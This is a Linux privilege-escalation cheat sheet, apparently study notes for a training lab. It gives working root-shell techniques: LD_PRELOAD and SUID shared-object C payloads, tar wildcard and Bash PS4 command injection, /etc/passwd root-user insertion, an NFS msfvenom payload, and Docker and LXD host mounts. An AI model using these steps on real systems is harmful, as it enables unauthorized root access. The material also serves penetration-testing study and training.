# Linux Privilege Escalation

## Table of Contents

* [Tools](#tools)
  * [Linux Smart Enumeration](#linux-smart-enumeration)
* [Passwords & Keys](#passwords--keys)
  * [History Files](#history-files)
  * [Configuration Files](#configuration-files)
  * [SSH Keys](#ssh-keys)
* [Weak File Permissions](#weak-file-permissions)
  * [Readable /etc/shadow](#readable-etcshadow)
  * [Writable /etc/shadow](#writable-etcshadow)
  * [Writable /etc/passwd](#writable-etcpasswd)
* [Sudo](#sudo)
  * [LD_PRELOAD](#ld_preload)
  * [LD_LIBRARY_PATH](#ld_library_path)
* [Cron Jobs](#cron-jobs)
  * [PATH Environment Variable](#path-environment-variable)
  * [Wildcard](#wildcard)
* [SUID/GUID](#suidguid)
  * [Shared Object Injection](#shared-object-injection)
  * [PATH Environment Varìable](#path-environment-varìable)
  * [Abusing Shell Features](#abusing-shell-features)
    * [Defining Shell Functions (Bash <4.2-048)](#defining-shell-functions-bash-42-048)
    * [Debugging Mode (Bash <4.4)](#debugging-mode-bash-44)
* [NFS Root Squashing](#nfs-root-squashing)
* [Containers](#containers)
  * [Docker](#docker)
  * [LXC/LXD](#lxclxd)
* [Kernel Exploits](#kernel-exploits)

## Tools

### Linux Smart Enumeration

> https://github.com/diego-treitos/linux-smart-enumeration

Transfer script to target host and run the following commands.
```bash
chmod +x lse.sh
./lse.sh -l1
```

## Passwords & Keys

### History Files
If a user types their username or password on the command line instead of into a password prompt, it may get recorded in a history file.

View the contents of all hidden history files in the user's home directory.
```bash
cat ~/.*history | less
```

### Configuration Files
Many services and programs use configuration files to store settings and sometimes credentials.
```bash
#check .conf files in /etc
ls -ls /etc/ | grep .conf

#check home directory
ls -la /home/[user]

#check web root
ls -la /var/www/html/

#CHECK EVERYWHERE!!
```

### SSH Keys
It is possible that a private key is stored insecurely, look for hidden directories such as `.ssh` or backup files.
```bash
#check root directory
ls -la /

#check home directory
ls -la /home/[user]
```

If a private key is found, copy/paste the key over to your host machine and change permissions. 
```bash
chmod 600 id_rsa
```

## Weak File Permissions

### Readable /etc/shadow
Save the root hash into a file and crack it with john the ripper.

```bash
ls -l /etc/shadow

john --list=formats
john --wordlist=/usr/share/wordlists/rockyou.txt --format=[format] hash.txt
```

Switch to the root user.
```bash
su - root
```

### Writable /etc/shadow
Generate a new password hash.

```bash
ls -l /etc/shadow

python -c 'import crypt;print(crypt.crypt("password", "$6$saltgoeshere"))'
mkpasswd -m sha512crypt -S saltgoeshere password
openssl passwd -6 -salt saltgoeshere password
```

Replace root's password hash.
```bash
root:[password hash]:17298:0:99999:7:::
```

### Writable /etc/passwd
Generate a new password hash.

```bash
ls -l /etc/passwd

python -c 'import crypt;print(crypt.crypt("password", "$6$saltgoeshere"))'
mkpasswd -m sha512crypt -S saltgoeshere password
openssl passwd -6 -salt saltgoeshere password
```

Replace root's 2nd field (x) with the password hash.
```bash
root:x:0:0:root:/root:/bin/bash
```

Alternatively, you can create a new root user by adding a new entry to the end of /etc/passwd.

```bash
newroot:[password hash]:0:0:root:/root:/bin/bash
su - newroot
```

## Sudo
> https://gtfobins.github.io/#+sudo

List commands a user is allowed to run.
```bash
sudo -l
```

Run a command as a specific user.
```bash
sudo -u [username] [command]
```

### LD_PRELOAD
Check if sudo is configured to preserve `LD_PRELOAD` through `env_keep`.
```bash
env_keep+=LD_PRELOAD
```

Compile the following code with `gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/preload.c` to create a shared object.
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

Run one of the commands listed in `sudo -l` while setting `LD_PRELOAD` to the full path of the new shared object to spawn a root shell.
```bash
sudo LD_PRELOAD=/tmp/preload.so [command]
```

### LD_LIBRARY_PATH
Check if sudo is configured to preserve `LD_LIBRARY_PATH` through `env_keep`.
```bash
env_keep+=LD_LIBRARY_PATH
```

Run `ldd` against one of the binaries listed in `sudo -l` to see which shared libraries are used by the binary.
```bash
ldd /usr/bin/find

        linux-vdso.so.1 =>  (0x00007fff7a7ff000)
        librt.so.1 => /lib/librt.so.1 (0x00007fa6ee9bf000)
        libm.so.6 => /lib/libm.so.6 (0x00007fa6ee73e000)
        libc.so.6 => /lib/libc.so.6 (0x00007fa6ee3d1000)
        libpthread.so.0 => /lib/libpthread.so.0 (0x00007fa6ee1b5000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fa6eebcd000)       
```

Compile the following code with `gcc -o /tmp/librt.so.1 -shared -fPIC /home/user/library_path.c` to create a shared object that has the same name as one of the shared libraries used by the binary.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

Run `find` with `sudo` while setting `LD_LIBRARY_PATH` to the the directory where the new shared object was outputted to spawn a root shell.
```bash
sudo LD_LIBRARY_PATH=/tmp/ find
```

## Cron Jobs
Crontabs store the configuration for cron jobs.

View the system-wide crontab.
```bash
cat /etc/crontab
```

View the user crontabs.
```bash
crontab -l

cd /var/spool/cron/
cd /var/spool/cron/crontabs/
```

### PATH Environment Variable
Check if a cron job script does not use an absolute path and if one of the PATH directories is writable to.
```bash
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

* * * * * root overwrite.sh
drwxr-xr-x 5 user user 4096 May 15  2020 user
```

Assume that overwrite.sh gets executed every minute.

Create a file called `overwrite.sh` in `/home/user` that creates a copy of `/bin/bash` in `/tmp` with the SUID bit set.
```bash
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
```

Run `/tmp/rootbash -p` to get a root shell.
```bash
-rwsr-sr-x 1 root root 926536 Sep 23 21:31 rootbash
/tmp/rootbash -p
```

### Wildcard
Check if a cronjob script is running a tar command with a wildcard.
```bash
tar czf /tmp/backup.tar.gz *
```

Assume that the tar command gets ran as part of a script every minute in `/home/user`.

It is possible to have a script run and execute arbitrary commands using tar checkpoint options as filenames.
```bash
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
```

```bash
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=script.sh
```

The wildcard will include these files in the tar command, in which tar will treat them as command line options rather than filenames.

Run `/tmp/rootbash -p` to spawn a root shell.
```bash
-rwsr-sr-x 1 root root 926536 Sep 23 23:18 rootbash
/tmp/rootbash -p
```

## SUID/GUID
Find files with the SUID and SGID bit set.
```bash
#SUID
find / -perm -u=s -type f -exec ls -l {} \; 2>/dev/null

#GUID
find / -perm -g=s -type f -exec ls -l {} \; 2>/dev/null
```

### Shared Object Injection
When a program is executed, it will try to load the shared objects it requires. By using `strace` on a program, the system calls can be tracked and this can help determine if any shared objects were not found. If a shared object was not found in a location that is writable to, it is possible to create a shared object with the same name.

Find files with the SUID bit set and check if any of those files load any shared objects that are not found in a writable directory.
```bash
find / -perm -u=s -type f -exec ls -l {} \; 2>/dev/null
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"

open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
```

Compile the following code with `gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/libcalc.c` to create a shared object.
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
        setuid(0);
        system("/bin/bash -p");
}
```

Run `/usr/local/bin/suid-so` to spawn a root shell.
```bash
/usr/local/bin/suid-so
```

### PATH Environment Varìable
If a program tries to execute another program and doesn't specify an absolute path, the PATH directories will be searched until it is found.

Find files with the SETUID bit set and check if any of those files are inheriting a user's PATH environment variable and are attempting to execute programs without specifying an absolute path.
```bash
find / -perm -u=s -type f -exec ls -l {} \; 2>/dev/null
strings /usr/local/bin/suid-env
strace -v -f -e execve /usr/local/bin/suid-env 2>&1 | grep exec

#output from strings
service apache2 start
```

It seems that `service` is attempting to run `apache2` without using the full path of `/usr/sbin/service` in the suid-env executable, which is confirmed using `strings` and `strace`.

Compile the following code with `gcc -o service /home/user/service.c` to create an executable called service.
```c
int main() {
        setuid(0);
        system("/bin/bash -p");
}
```

Run `/usr/local/bin/suid-env` while prepending the directory of the new service executable to the PATH environment variable to spawn a root shell.
```bash
PATH=/home/user/:$PATH /usr/local/bin/suid-env
```

### Abusing Shell Features

#### Defining Shell Functions (Bash <4.2-048)
In Bash versions `<4.2-048`, it is possible to define shell functions with an absolute path. These shell functions can be exported and can take precedence over the actual executable that is being called.

Find files with the SETUID bit set and use `strings` to check if any of those files are attempting to execute programs with an absolute path.
```bash
find / -perm -u=s -type f -exec ls -l {} \; 2>/dev/null
strings /usr/local/bin/suid-env2

#output from strings
/usr/sbin/service apache2 start
```

Check the Bash version.
```bash
/bin/bash --version
GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)
```

Create a function named `/usr/sbin/service` that executes `/bin/bash -p` and export the function.
```bash
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
```

Run `/usr/local/bin/suid-env2` and the function we just exported will have precedence over the original `/usr/sbin/service` that was being called, which in turn will spawn a root shell.
```bash
/usr/local/bin/suid-env2
```

#### Debugging Mode (Bash <4.4)
Bash's debugging mode can be enabled by modifying the `SHELLOPTS` environment variable to include `xtrace`, and the `env` command allows SHELLOPTS to be set. When in debugging mode, Bash uses the `PS4` environment variable to display an extra prompt for debug statements which can include an embedded command that will execute every time.

In Bash versions `4.4` and above, the PS4 environment variable is not inherited by shells running as root.

Find files with the SETUID bit set and use `strace` to check if any of those files are inheriting a user's PATH environment variable.
```bash
find / -perm -u=s -type f -exec ls -l {} \; 2>/dev/null
strace -v -f -e execve /usr/local/bin/suid-env2 2>&1 | grep exec
```

Check the Bash version.
```bash
/bin/bash --version
GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)
```

Run `/usr/local/bin/suid-env2` with bash debugging enabled and the PS4 environment variable set to an embedded command of our choice to execute arbitrary commands.
```bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
```

Run `/tmp/rootbash -p` to spawn a root shell.
```bash
-rwsr-sr-x 1 root root 926536 Sep 24 06:21 rootbash
/tmp/rootbash -p
```

## NFS Root Squashing
If `no_root_squash` is enabled in a writable NFS share, a remote user can create files on that NFS share as the local root user.

Check the NFS share configuration.
```bash
cat /etc/exports

/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
```

Create a mount point on the attacker machine and mount the exported NFS share.
```bash
#display exported shares
showmount -e [target ip]

mkdir /tmp/nfs
mount -o rw,vers=2 [target ip]:/tmp /tmp/nfs
```

Generate a payload using `msfvenom` that calls `/bin/bash` and save it to the mounted share. Make the file executable and set the SUID bit.
```bash
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
chmod +xs /tmp/nfs/shell.elf
```

Run `/tmp/shell.elf` to spawn a root shell.
```bash
/tmp/shell.elf
```

## Containers

### Docker
Check if the user is part of the `docker` group.

Basic Docker commands.
```bash
#view a list of all images on the system
docker image ls

#run a docker container and run a single command inside that container
docker run [image] [command]

#get an interactive shell on a Docker container to run multiple commands
docker container run -it [image] /bin/bash
```

Mount the host filesystem into a container.
```bash
#mount /etc to a docker container and add a new user to the Docker host system
docker run -v /etc:/mnt -it [image]
cd /mnt
echo 'hacker:$5$salt$Gcm6FsVtF/Qa77ZKD.iwsJlCVPY0XSMgLJL0Hnww/c1:0:0:root:/root:/bin/bash' >> passwd
```

### LXC/LXD
Check if the user is part of the `lxd` group, and if so, mount the host filesystem into a container.

On the attacker machine, clone the LXD Alpine builder repository and run the script to build the latest Alpine image.
```bash
git clone https://github.com/saghul/lxd-alpine-builder.git
./build-alpine
```

Transfer the tar file containing the image to the target host.

LXD initialization process may need to be started, select all default options, except for storage backend which should be "dir".
```bash
lxc init
```

Import the tar Alpine image into LXC, verify it has been imported, and assign security privileges.
```bash
lxc image import [image filename] --alias myimage
lxc image list
lxc init myimage shell -c security.privileged=true
```

Mount the full disk of the host machine to /mnt/root.
```bash
lxc config device add shell mydevice disk source=/ path=/mnt/root recursive=true
```

Start the container and verify the container is running.
```bash
lxc start shell
lsx ls
```

Spawn a shell inside the running container and navigate to /mnt/root.
```bash
lxc exec shell /bin/bash
```

## Kernel Exploits
Kernel exploits can be unstable, so use only as a last resort.

> https://github.com/jondonas/linux-exploit-suggester-2

Identify linux kernel exploits with this perl script.
```bash
perl linux-exploit-suggester-2.pl
```

Enumerate the kernel version.
```bash
uname -a
```

Find matching exploits.

* https://www.google.com/
* https://www.exploit-db.com/

Compile and run. (follow the compile instructions)
```bash
gcc -pthread [code file] -o [output filename]
./exploit
```
